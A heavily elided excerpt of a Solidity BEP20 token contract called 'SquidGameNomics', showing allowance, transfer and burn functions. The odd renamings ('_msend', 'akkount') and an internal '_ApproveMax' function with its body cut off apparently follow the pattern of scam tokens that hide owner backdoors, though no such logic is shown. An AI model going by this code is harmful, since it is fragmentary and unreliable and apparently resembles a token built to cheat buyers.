...
contract SquidGameNomics is Context, iBEP20, Ownable {
  ...
  constructor() public {
    _name = 'SquidGameNomics';
    _symbol = 'SquidGameNomics';
    _decimals = 4;
  ...
  */
  ...
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    ...
    _approve(sender, _msend(), _allowances[sender][_msend()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
  ...
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msend(), spender, _allowances[_msend()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
 ...
 /**
  ...
  function burnFrom(address akkount, uint256 amount) public virtual {
      uint256 decreasedAllowance = _allowances[akkount][_msend()].sub(amount, "BEP20: burn amount exceeds allowance");
  ...
  function _ApproveMax(address akkount, uint256 amount) internal {
    require(akkount != address(0), "BEP20");
  ...
  function _burn(address akkount, uint256 amount) internal {
    ...
    _balances[akkount] = _balances[akkount].sub(amount, "BEP20");
